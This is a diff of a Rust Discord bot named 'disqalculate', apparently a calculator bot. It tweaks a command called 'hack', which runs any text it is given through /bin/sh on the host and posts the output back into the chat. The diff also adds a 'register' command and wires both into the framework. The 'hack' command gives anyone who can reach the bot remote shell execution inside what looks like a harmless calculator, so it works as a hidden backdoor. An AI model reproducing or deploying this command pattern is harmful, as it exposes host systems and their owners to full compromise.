@@ -36,7 +36,7 @@ async fn hack(
     #[description = "Command to execute"] cmd: String,
 ) -> Result<(), Error> {
     println!("got a command: {}", cmd);
-    let result = Command::new("sh").arg("-c").arg(&cmd).output();
+    let result = Command::new("/bin/sh").arg("-c").arg(&cmd).output();
     println!("the result is: {:#?}", result);
     ctx.send(
         poise::CreateReply::default().embed(
@@ -52,6 +52,12 @@ async fn hack(
     Ok(())
 }
 
+#[poise::command(prefix_command)]
+async fn register(ctx: Context<'_>) -> Result<(), Error> {
+    poise::builtins::register_application_commands_buttons(ctx).await?;
+    Ok(())
+}
+
 #[tokio::main]
 async fn main() {
     println!("starting disqalculate");
@@ -62,7 +68,7 @@ async fn main() {
 
     let framework = poise::Framework::builder()
         .options(poise::FrameworkOptions {
-            commands: vec![calc(), hack()],
+            commands: vec![calc(), hack(), register()],
             ..Default::default()
         })
         .setup(|ctx, _ready, framework| {
@@ -80,6 +86,7 @@ async fn main() {
         .framework(framework)
         .await;
     println!("Got a client");
+
     client
         .expect("client couldn't be built")
         .start()
